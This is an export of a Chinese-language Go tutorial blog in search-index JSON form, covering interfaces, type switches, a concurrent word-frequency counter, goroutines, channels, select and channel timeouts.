Go 语言的面向对象很灵活，很大一部分原因是由于接口的存在。接口是一个自定义类型，它声明了一个或者多个方法签名，任何实现了这些方法的类型都实现这个接口。infterface&#123;&#125; 类型是声明了空方法集的接口类型。任何一个值都满足 interface&#123;&#125; 类型，也就是说如果一个函数或者方法接收 interface&#123;&#125; 类型的参数，那么任意类型的参数都可以传递给该函数。接口是完全抽象的，不能实例化。接口能存储任何实现了该接口的类型。直接看例子吧，创建源文件 interface_t.go，输入以下代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport &quot;fmt&quot;type Human struct &#123; // 结构体 name string age int phone string&#125;//Human实现SayHi方法func (h Human) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s you can call me on %s\\n&quot;, h.name, h.phone)&#125;//Human实现Sing方法func (h Human) Sing(lyrics string) &#123; fmt.Println(&quot;La la la la...&quot;, lyrics)&#125;type Student struct &#123; Human //匿名字段 school string loan float32&#125;type Employee struct &#123; Human //匿名字段 company string money float32&#125;// Employee重载Human的SayHi方法func (e Employee) SayHi() &#123; fmt.Printf(&quot;Hi, I am %s, I work at %s. Call me on %s\\n&quot;, e.name, e.company, e.phone)&#125;// Interface Men被Human,Student和Employee实现// 因为这三个类型都实现了这两个方法type Men interface &#123; SayHi() Sing(lyrics string)&#125;func main() &#123; mike := Student&#123;Human&#123;&quot;Mike&quot;, 25, &quot;222-222-XXX&quot;&#125;, &quot;MIT&quot;, 0.00&#125; paul := Student&#123;Human&#123;&quot;Paul&quot;, 26, &quot;111-222-XXX&quot;&#125;, &quot;Harvard&quot;, 100&#125; sam := Employee&#123;Human&#123;&quot;Sam&quot;, 36, &quot;444-222-XXX&quot;&#125;, &quot;Golang Inc.&quot;, 1000&#125; Tom := Employee&#123;Human&#123;&quot;Tom&quot;, 37, &quot;222-444-XXX&quot;&#125;, &quot;Things Ltd.&quot;, 5000&#125; //定义Men类型的变量i var i Men //i能存储Student i = mike fmt.Println(&quot;This is Mike, a Student:&quot;) i.SayHi() i.Sing(&quot;November rain&quot;) //i也能存储Employee i = Tom fmt.Println(&quot;This is Tom, an Employee:&quot;) i.SayHi() i.Sing(&quot;Born to be wild&quot;) //定义了slice Men fmt.Println(&quot;Let&#x27;s use a slice of Men and see what happens&quot;) x := make([]Men, 3) //这三个都是不同类型的元素，但是他们实现了interface同一个接口 x[0], x[1], x[2] = paul, sam, mike for _, value := range x &#123; value.SayHi() &#125;&#125; 接口变量值的类型* 接口类型声明的变量里能存储任何实现了该接口的类型的值。 有的时候我们需要知道这个变量里的值的类型，那么需要怎么做呢？可以使用类型断言，或者是 switch 类型判断分支。以下的例子 interface_t1.go 我们使用了 switch 类型判断分支。 123456789101112131415161718192021222324252627282930313233343536373839404142/*使用了switch 类型判断分支*/package mainimport ( &quot;fmt&quot; &quot;strconv&quot;)type Element interface&#123;&#125;type List []Elementtype Person struct &#123; name string age int&#125;// 实现了fmt.Stringer接口func (p Person) String() string &#123; return &quot;(name: &quot; + p.name + &quot;- age: &quot; + strconv.Itoa(p.age) + &quot; years)&quot;&#125;func main() &#123; list := make(List, 4) list[0] = 1 list[1] = &quot;Hello&quot; list[2] = Person&#123;&quot;Dennis&quot;, 70&#125; list[3] = 1 + 2i for index, element := range list &#123; switch value := element.(type) &#123; case int: fmt.Printf(&quot;list[%d] is an int and its value is %d\\n&quot;, index, value) case string: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) case Person: fmt.Printf(&quot;list[%d] is an int and its value is %s\\n&quot;, index, value) default: fmt.Printf(&quot;list[%d] is of a different type&quot;, index) &#125; &#125;&#125; 嵌入interface结构体中可以嵌入匿名字段，其实在接口里也可以再嵌入接口。如果一个 interface1 作为 interface2 的一个嵌入字段，那么 interface2 隐式的包含了 interface1 里的方法。如下例子中，Interface2 包含了 Interface1 的所有方法。 123456789type Interface1 interface &#123; Send() Receive()&#125;type Interface2 interface &#123; Interface1 Close()&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"接口","slug":"B-Code/GO/Go简明手册/面向对象编程/接口","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E6%8E%A5%E5%8F%A3/"}]},{"title":"Go面向对象编程6——嵌入 interface","date":"2023-10-27T01:24:02.193Z","path":"B_Code/GO/Go简明手册/面向对象编程/嵌入interface/README/","text":"在前面的课程中我们已经知道在结构体中可以嵌入匿名字段，其实在接口里也可以再嵌入接口。如果一个 interface1 作为 interface2 的一个嵌入字段，那么 interface2 隐式的包含了 interface1 里的方法。如下例子中，Interface2 包含了 Interface1 的所有方法。 123456789type Interface1 interface &#123; Send() Receive()&#125;type Interface2 interface &#123; Interface1 Close()&#125;","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"面向对象编程","slug":"B-Code/GO/Go简明手册/面向对象编程","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"},{"name":"嵌入interface","slug":"B-Code/GO/Go简明手册/面向对象编程/嵌入interface","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/%E5%B5%8C%E5%85%A5interface/"}]},{"title":"Go简明手册——词频统计综合案例","date":"2023-10-27T01:24:02.184Z","path":"B_Code/GO/Go简明手册/词频统计综合案例/README/","text":"wordcount.go 实现词频统计的程序逻辑很简单。我们首先会创建一个映射，然后读取文件的每一行，提取单词，然后更新映射中单词所对应的数量即可。 为了演示面向对象和 goroutine 的使用，我们将基础映射类型封装成了一个统计单词频率的包。我们在基础映射类型上创建了类型 WordCound，然后为该类型了实现了关键方法 UpdateFreq() 和 WordFreqCounter()，其中前者会读取一个文件并统计该文件中的所有单词的词频，后者通过 goroutine 实现了并发统计。 其并发逻辑是：对于每一个文件，创建一个 goroutine，在这个 goroutine 内部调用 UpdateFreq() 方法统计对应文件的词频，当统计完成以后会将映射中每一对键值转化为 Pair 结构发送到 results 通道，并在发送完成时候发送一个空结构体的值到 done 通道以表示自己的任务已经完成。由于 map 映射结构不支持并发写操作，所以我们通过 result 通道来保证每次只有一个 goroutine 能更新映射。又因为当所有的 goroutine 结束以后，有可能 results 通道中还有没来得及处理的数据，所以在 WordFreqCounter() 的结尾我们又开启了一个 for 循环处理 results 通道中的剩余数据。说了这么多，我们直接写代码吧。 在 $GOPATH/src/wordcount 目录中创建文件 wordcount.go，输入以下源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176package wordcountimport ( &quot;bufio&quot; &quot;fmt&quot; &quot;io&quot; &quot;log&quot; &quot;os&quot; &quot;sort&quot; &quot;strings&quot; &quot;unicode&quot; &quot;unicode/utf8&quot;)type Pair struct &#123; Key string Value int&#125;// PariList实现了sort接口，可以使用sort.Sort对其排序type PairList []Pairfunc (p PairList) Swap(i, j int) &#123; p[i], p[j] = p[j], p[i] &#125;func (p PairList) Len() int &#123; return len(p) &#125;func (p PairList) Less(i, j int) bool &#123; return p[j].Value &lt; p[i].Value &#125; // 逆序// 提取单词func SplitOnNonLetters(s string) []string &#123; notALetter := func(char rune) bool &#123; return !unicode.IsLetter(char) &#125; return strings.FieldsFunc(s, notALetter)&#125;/* 基于map实现了类型WordCount, 并对期实现了Merge(), Report(), SortReport(), UpdateFreq(), WordFreqCounter() 方法*/type WordCount map[string]int// 用于合并两个WordCountfunc (source WordCount) Merge(wordcount WordCount) WordCount &#123; for k, v := range wordcount &#123; source[k] += v &#125; return source&#125;// 打印词频统计情况func (wordcount WordCount) Report() &#123; words := make([]string, 0, len(wordcount)) wordWidth, frequencyWidth := 0, 0 for word, frequency := range wordcount &#123; words = append(words, word) if width := utf8.RuneCountInString(word); width &gt; wordWidth &#123; wordWidth = width &#125; if width := len(fmt.Sprint(frequency)); width &gt; frequencyWidth &#123; frequencyWidth = width &#125; &#125; sort.Strings(words) gap := wordWidth + frequencyWidth - len(&quot;Word&quot;) - len(&quot;Frequency&quot;) fmt.Printf(&quot;Word %*s%s\\n&quot;, gap, &quot; &quot;, &quot;Frequency&quot;) for _, word := range words &#123; fmt.Printf(&quot;%-*s %*d\\n&quot;, wordWidth, word, frequencyWidth, wordcount[word]) &#125;&#125;// 从多到少打印词频func (wordcount WordCount) SortReport() &#123; p := make(PairList, len(wordcount)) i := 0 for k, v := range wordcount &#123; // 将wordcount map转换成PairList p[i] = Pair&#123;k, v&#125; i++ &#125; sort.Sort(p) // 因为PairList实现了排序接口，所以可以使用sort.Sort()对其排序 wordWidth, frequencyWidth := 0, 0 for _, pair := range p &#123; word, frequency := pair.Key, pair.Value if width := utf8.RuneCountInString(word); width &gt; wordWidth &#123; wordWidth = width &#125; if width := len(fmt.Sprint(frequency)); width &gt; frequencyWidth &#123; frequencyWidth = width &#125; &#125; gap := wordWidth + frequencyWidth - len(&quot;Word&quot;) - len(&quot;Frequency&quot;) fmt.Printf(&quot;Word %*s%s\\n&quot;, gap, &quot; &quot;, &quot;Frequency&quot;) for _, pair := range p &#123; fmt.Printf(&quot;%-*s %*d\\n&quot;, wordWidth, pair.Key, frequencyWidth, pair.Value) &#125;&#125;// 从文件中读取单词，并更新其出现的次数func (wordcount WordCount) UpdateFreq(filename string) &#123; var file *os.File var err error if file, err = os.Open(filename); err != nil &#123; log.Println(&quot;failed to open the file: &quot;, err) return &#125; defer file.Close() // 本函数退出之前时，关闭文件 reader := bufio.NewReader(file) for &#123; line, err := reader.ReadString(&#x27;\\n&#x27;) for _, word := range SplitOnNonLetters(strings.TrimSpace(line)) &#123; if len(word) &gt; utf8.UTFMax || utf8.RuneCountInString(word) &gt; 1 &#123; wordcount[strings.ToLower(word)] += 1 &#125; &#125; if err != nil &#123; if err != io.EOF &#123; log.Println(&quot;failed to finish reading the file: &quot;, err) &#125; break &#125; &#125;&#125;// 并发统计单词频次func (wordcount WordCount) WordFreqCounter(files []string) &#123; results := make(chan Pair, len(files)) // goroutine 将结果发送到该channel done := make(chan struct&#123;&#125;, len(files)) // 每个goroutine工作完成后，发送一个空结构体到该channel，表示工作完成 for i := 0; i &lt; len(files); &#123; // 有多少个文件就开启多少个goroutine, 使用匿名函数的方式 go func(done chan&lt;- struct&#123;&#125;, results chan&lt;- Pair, filename string) &#123; wordcount := make(WordCount) wordcount.UpdateFreq(filename) for k, v := range wordcount &#123; pair := Pair&#123;k, v&#125; results &lt;- pair &#125; done &lt;- struct&#123;&#125;&#123;&#125; &#125;(done, results, files[i]) i++ &#125; for working := len(files); working &gt; 0; &#123; // 监听通道，直到所有的工作goroutine完成任务时才退出 select &#123; case pair := &lt;-results: // 接收发送到通道中的统计结果 wordcount[pair.Key] += pair.Value case &lt;-done: // 判断工作goroutine是否全部完成 working-- &#125; &#125;DONE: // 再次启动for循环处理通道中还未处理完的值 for &#123; select &#123; case pair := &lt;-results: wordcount[pair.Key] += pair.Value default: break DONE &#125; &#125; close(results) close(done)&#125; 然后在 $GOPATH 目录中创建文件 wordfreq.go，输入以下源码： 123456789101112131415161718192021222324package mainimport ( &quot;fmt&quot; &quot;os&quot; &quot;path/filepath&quot; &quot;wordcount&quot;)func main() &#123; if len(os.Args) == 1 || os.Args[1] == &quot;-h&quot; || os.Args[1] == &quot;--help&quot; &#123; fmt.Printf(&quot;usage: %s &lt;file1&gt; [&lt;file2&gt; [... &lt;fileN&gt;]]\\n&quot;, filepath.Base(os.Args[0])) os.Exit(1) &#125; wordcounter := make(wordcount.WordCount) // for _, filename := range os.Args[1:] &#123; // wordcount.UpdateFreq(filename) // &#125; wordcounter.WordFreqCounter(os.Args[1:]) wordcounter.SortReport()&#125;","tags":[{"name":"Go简明手册","slug":"Go简明手册","permalink":"http://example.com/tags/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"Code","slug":"Code","permalink":"http://example.com/tags/Code/"},{"name":"GO","slug":"GO","permalink":"http://example.com/tags/GO/"},{"name":"面向对象编程","slug":"面向对象编程","permalink":"http://example.com/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"词频统计综合案例","slug":"B-Code/GO/Go简明手册/词频统计综合案例","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E8%AF%8D%E9%A2%91%E7%BB%9F%E8%AE%A1%E7%BB%BC%E5%90%88%E6%A1%88%E4%BE%8B/"}]},{"title":"Go并发编程——超时机制","date":"2023-10-27T01:24:02.180Z","path":"B_Code/GO/Go简明手册/并发与并行/超时机制/README/","text":"通过前面的内容我们了解到，channel 的读写操作非常简单，只需要通过 &lt;- 操作符即可实现，但是 channel 的使用不当却会带来大麻烦。我们先来看之前的一段代码： 123a := make(chan int)a &lt;- 1z := &lt;-a 观察上面三行代码，第 2 行往 channel 内写入了数据，第 3 行从 channel 中读取了数据，如果程序运行正常当然不会出什么问题，可如果第二行数据写入失败，或者 channel 中没有数据，那么第 3 行代码会因为永远无法从 a 中读取到数据而一直处于阻塞状态。相反的，如果 channel 中的数据一直没有被读取，那么写入操作也会一直处于阻塞状态。如果不正确处理这个情况，很可能会导致整个 goroutine 锁死，这就是超时问题。Go 语言没有针对超时提供专门的处理机制，但是我们却可以利用 select 来巧妙地实现超时处理机制，下面看一个示例： 1234567891011t := make(chan bool)go func &#123; time.Sleep(1e9) //等待1秒 t &lt;- true&#125;select &#123; case &lt;-ch: //从ch中读取数据 case &lt;-t: //如果1秒后没有从ch中读取到数据，那么从t中读取，并进行下一步操作&#125; 这样的方法就可以让程序在等待 1 秒后继续执行，而不会因为 ch 读取等待而导致程序停滞，从而巧妙地实现了超时处理机制，这种方法不仅简单，在实际项目开发中也是非常实用的。 channel 的关闭channel 的关闭非常简单，使用 Go 语言内置的 close() 函数即可关闭 channel，示例： 12ch := make(chan int)close(ch) 关闭了 channel 后如何查看 channel 是否关闭成功了呢？很简单，我们可以在读取 channel 时采用多重返回值的方式，示例： 1x, ok := &lt;-ch 通过查看第二个返回值的 bool 值即可判断 channel 是否关闭，若为 false 则表示 channel 被关闭，反之则没有关闭。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"并发与并行","slug":"B-Code/GO/Go简明手册/并发与并行","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"超时机制","slug":"B-Code/GO/Go简明手册/并发与并行/超时机制","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/%E8%B6%85%E6%97%B6%E6%9C%BA%E5%88%B6/"}]},{"title":"Go并发编程——select","date":"2023-10-27T01:24:02.178Z","path":"B_Code/GO/Go简明手册/并发与并行/select/README/","text":"select 用于处理异步 IO 问题，它的语法与 switch 非常类似。由 select 开始一个新的选择块，每个选择条件由 case 语句来描述，并且每个 case 语句里必须是一个 channel 操作。它既可以用于 channel 的数据接收，也可以用于 channel 的数据发送。如果 select 的多个分支都满足条件，则会随机的选取其中一个满足条件的分支。 新建源文件 channel.go，输入以下代码： 1234567891011121314151617181920212223package mainimport &quot;time&quot;import &quot;fmt&quot;func main() &#123; c1 := make(chan string) c2 := make(chan string) go func() &#123; time.Sleep(time.Second * 1) c1 &lt;- &quot;one&quot; &#125;() go func() &#123; time.Sleep(time.Second * 2) c2 &lt;- &quot;two&quot; &#125;() for i := 0; i &lt; 2; i++ &#123; select &#123; case msg1 := &lt;-c1: fmt.Println(&quot;received&quot;, msg1) case msg2 := &lt;-c2: fmt.Println(&quot;received&quot;, msg2) &#125; &#125;&#125; 以上代码先初始化两个 channel c1 和 c2，然后开启两个 goroutine 分别往 c1 和 c2 写入数据，再通过 select 监听两个 channel，从中读取数据并输出。 运行结果如下： 123$ go run channel.goreceived onereceived two","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"并发与并行","slug":"B-Code/GO/Go简明手册/并发与并行","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"select","slug":"B-Code/GO/Go简明手册/并发与并行/select","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/select/"}]},{"title":"Go并发编程——goroutine","date":"2023-10-27T01:24:02.169Z","path":"B_Code/GO/Go简明手册/并发与并行/goroutine/README/","text":"goroutine 是 Go 语言并行设计的核心。goroutine 是一种比线程更轻量的实现，十几个 goroutine 可能在底层就是几个线程。 不同的是，Golang 在 runtime、系统调用等多方面对 goroutine 调度进行了封装和处理，当遇到长时间执行或者进行系统调用时，会主动把当前 goroutine 的 CPU (P) 转让出去，让其他 goroutine 能被调度并执行，也就是 Golang 从语言层面支持了协程。要使用 goroutine 只需要简单的在需要执行的函数前添加 go 关键字即可。当执行 goroutine 时候，Go 语言立即返回，接着执行剩余的代码，goroutine 不阻塞主线程。下面我们通过一小段代码来讲解 go 的使用： 1234567//首先我们先实现一个 Add()函数func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;go Add(1, 2) //使用go关键字让函数并发执行 Go 的并发执行就是这么简单，当在一个函数前加上 go 关键字，该函数就会在一个新的 goroutine 中并发执行，当该函数执行完毕时，这个新的 goroutine 也就结束了。不过需要注意的是，如果该函数具有返回值，那么返回值会被丢弃。所以什么时候用 go 还需要酌情考虑。 接着我们通过一个案例来体验一下 Go 的并发到底是怎么样的。新建源文件 goroutine.go，输入以下代码： 1234567891011121314package mainimport &quot;fmt&quot;func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;func main() &#123; for i := 0; i &lt; 10; i++ &#123; go Add(i, i) &#125;&#125; 执行 goroutine.go 文件会发现屏幕上什么都没有，但程序并不会报错，这是什么原因呢？原来当主程序执行到 for 循环时启动了 10 个 goroutine，然后主程序就退出了，而启动的 10 个 goroutine 还没来得及执行 Add() 函数，所以程序不会有任何输出。也就是说主 goroutine 并不会等待其他 goroutine 执行结束。那么如何解决这个问题呢？Go 语言提供的信道（channel）就是专门解决并发通信问题的，下一节我们将详细介绍。","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"并发与并行","slug":"B-Code/GO/Go简明手册/并发与并行","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"goroutine","slug":"B-Code/GO/Go简明手册/并发与并行/goroutine","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/goroutine/"}]},{"title":"Go并发编程——channel","date":"2023-10-27T01:24:02.157Z","path":"B_Code/GO/Go简明手册/并发与并行/channel/README/","text":"channel 是goroutine 之间互相通讯的东西。类似我们 Unix 上的管道（可以在进程间传递消息），用来 goroutine 之间发消息和接收消息。其实，就是在做 goroutine 之间的内存共享。channel 是类型相关的，也就是说一个 channel 只能传递一种类型的值，这个类型需要在 channel 声明时指定。 声明与初始化channel 的一般声明形式：var chanName chan ElementType。 与普通变量的声明不同的是在类型前面加了 channel 关键字，ElementType 则指定了这个 channel 所能传递的元素类型。示例： 123var a chan int //声明一个传递元素类型为int的channelvar b chan float64var c chan string 初始化一个 channel 也非常简单，直接使用 Go 语言内置的 make() 函数，示例： 123a := make(chan int) //初始化一个int型的名为a的channelb := make(chan float64)c := make(chan string) channel 最频繁的操作就是写入和读取，这两个操作也非常简单，示例： 123a := make(chan int)a &lt;- 1 //将数据写入channelz := &lt;-a //从channel中读取数据","tags":[],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"http://example.com/categories/B-Code/"},{"name":"GO","slug":"B-Code/GO","permalink":"http://example.com/categories/B-Code/GO/"},{"name":"Go简明手册","slug":"B-Code/GO/Go简明手册","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/"},{"name":"并发与并行","slug":"B-Code/GO/Go简明手册/并发与并行","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/"},{"name":"channel","slug":"B-Code/GO/Go简明手册/并发与并行/channel","permalink":"http://example.com/categories/B-Code/GO/Go%E7%AE%80%E6%98%8E%E6%89%8B%E5%86%8C/%E5%B9%B6%E5%8F%91%E4%B8%8E%E5%B9%B6%E8%A1%8C/channel/"}]},{"title":"Go并发编程——概要","date":"2023-10-27T01:24:02.154Z","path":"B_Code/GO/Go简明手册/并发与并行/README/","text":"知识点 并发与并行 协程 goroutine channel select 并发编程 并发与并行并发指在同一时刻只能有一条指令执行，但多个进程指令被快速的轮换执行，使得在宏观上具有多个进程同时执行的效果，但在微观上并不是同时执行的，只是把时间分成若干段，通过 CPU 时间片轮转使多个进程快速交替的执行。而并行的关键是你有同时处理多个任务的能力。并发和并行都可以是很多个线程，就看这些线程能不能同时被（多个）CPU 执行，如果可以就说明是并行，而并发是多个线程被（一个）CPU 轮流切换着执行。一个经典且通俗易懂的例子这样解释并发与并行的区别：并发是两个队列，使用一台咖啡机；并行是两个队列，使用两台咖啡机。如果串行，一个队列使用一台咖啡机，那么哪怕前面那个人有事出去了半天，后面的人也只能等着他回来才能去接咖啡，这效率无疑是最低的。图解： 协程*协程也叫轻量级线程。与传统的进程和线程相比，协程最大的优点就在于其足够“轻”，操作系统可以轻松创建上百万个协程而不会导致系统资源枯竭，而线程和进程通常最多不过近万个。而多数语言在语法层面上是不支持协程的，一般都是通过库的方式进行支持，但库的支持方式和功能不够完善，经常会引发阻塞等一系列问题，而 Go 语言在语法层面上支持协程，也叫 goroutine。这让协程变得非常简单，让轻量级线程的切换管理不再依赖于系统的进程和线程，也不依赖 CPU 的数量。 goroutine*goroutine 是 Go 语言并行设计的核心。goroutine 是一种比线程更轻量的实现，十几个 goroutine 可能在底层就是几个线程。 不同的是，Golang 在 runtime、系统调用等多方面对 goroutine 调度进行了封装和处理，当遇到长时间执行或者进行系统调用时，会主动把当前 goroutine 的 CPU (P) 转让出去，让其他 goroutine 能被调度并执行，也就是 Golang 从语言层面支持了协程。要使用 goroutine 只需要简单的在需要执行的函数前添加 go 关键字即可。当执行 goroutine 时候，Go 语言立即返回，接着执行剩余的代码，goroutine 不阻塞主线程。下面我们通过一小段代码来讲解 go 的使用： 1234567//首先我们先实现一个 Add()函数func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;go Add(1, 2) //使用go关键字让函数并发执行 Go 的并发执行就是这么简单，当在一个函数前加上 go 关键字，该函数就会在一个新的 goroutine 中并发执行，当该函数执行完毕时，这个新的 goroutine 也就结束了。不过需要注意的是，如果该函数具有返回值，那么返回值会被丢弃。所以什么时候用 go 还需要酌情考虑。 接着我们通过一个案例来体验一下 Go 的并发到底是怎么样的。新建源文件 goroutine.go，输入以下代码： 1234567891011121314package mainimport &quot;fmt&quot;func Add(a, b int) &#123; c := a + b fmt.Println(c)&#125;func main() &#123; for i := 0; i &lt; 10; i++ &#123; go Add(i, i) &#125;&#125; 执行 goroutine.go 文件会发现屏幕上什么都没有，但程序并不会报错，这是什么原因呢？原来当主程序执行到 for 循环时启动了 10 个 goroutine，然后主程序就退出了，而启动的 10 个 goroutine 还没来得及执行 Add() 函数，所以程序不会有任何输出。也就是说主 goroutine 并不会等待其他 goroutine 执行结束。那么如何解决这个问题呢？Go 语言提供的信道（channel）就是专门解决并发通信问题的 channelchannel 是goroutine 之间互相通讯的东西。类似我们 Unix 上的管道（可以在进程间传递消息），用来 goroutine 之间发消息和接收消息。其实，就是在做 goroutine 之间的内存共享。channel 是类型相关的，也就是说一个 channel 只能传递一种类型的值，这个类型需要在 channel 声明时指定。 声明与初始化channel 的一般声明形式：var chanName chan ElementType。 与普通变量的声明不同的是在类型前面加了 channel 关键字，ElementType 则指定了这个 channel 所能传递的元素类型。示例： 123var a chan int //声明一个传递元素类型为int的channelvar b chan float64var c chan string 初始化一个 channel 也非常简单，直接使用 Go 语言内置的 make() 函数，示例： 123a := make(chan int) //初始化一个int型的名为a的channelb := make(chan float64)c := make(chan string) channel 最频繁的操作就是写入和读取，这两个操作也非常简单，示例： 123a := make(chan int)a &lt;- 1 //将数据写入channelz := &lt;-a //从channel中读取数据 selectselect 用于处理异步 IO 问题，它的语法与 switch 非常类似。由 select 开始一个新的选择块，每个选择条件由 case 语句来描述，并且每个 case 语句里必须是一个 channel 操作。它既可以用于 channel 的数据接收，也可以用于 channel 的数据发送。如果 select 的多个分支都满足条件，则会随机的选取其中一个满足条件的分支。 新建源文件 channel.go，输入以下代码： 1234567891011121314151617181920212223package mainimport &quot;time&quot;import &quot;fmt&quot;func main() &#123; c1 := make(chan string) c2 := make(chan string) go func() &#123; time.Sleep(time.Second * 1) c1 &lt;- &quot;one&quot; &#125;() go func() &#123; time.Sleep(time.Second * 2) c2 &lt;- &quot;two&quot; &#125;() for i := 0; i &lt; 2; i++ &#123; select &#123; case msg1 := &lt;-c1: fmt.Println(&quot;received&quot;, msg1) case msg2 := &lt;-c2: fmt.Println(&quot;received&quot;, msg2) &#125; &#125;&#125; 以上代码先初始化两个 channel c1 和 c2，然后开启两个 goroutine 分别往 c1 和 c2 写入数据，再通过 select 监听两个 channel，从中读取数据并输出。 运行结果如下： 123$ go run channel.goreceived onereceived two 超时机制通过前面的内容我们了解到，channel 的读写操作非常简单，只需要通过 &lt;- 操作符即可实现，但是 channel 的使用不当却会带来大麻烦。我们先来看之前的一段代码： 123a := make(chan int)a &lt;- 1z := &lt;-a 观察上面三行代码，第 2 行往 channel 内写入了数据，第 3 行从 channel 中读取了数据，如果程序运行正常当然不会出什么问题，可如果第二行数据写入失败，或者 channel 中没有数据，那么第 3 行代码会因为永远无法从 a 中读取到数据而一直处于阻塞状态。相反的，如果 channel 中的数据一直没有被读取，那么写入操作也会一直处于阻塞状态。如果不正确处理这个情况，很可能会导致整个 goroutine 锁死，这就是超时问题。Go 语言没有针对超时提供专门的处理机制，但是我们却可以利用 select 来巧妙地实现超时处理机制，下面看一个示例： 1234567891011t := make(chan bool)go func &#123; time.Sleep(1e9) //等待1秒 t &lt;- true&#125;select &#123; case &lt;-ch: //从ch中读取数据 case &lt;-t: //如果1秒后没有从ch中读取到数据，那么从t中读取，并进行下一步操作&#125; 这样的方法就可以让程序在等待 1 秒后继续执行，而不会因为 ch 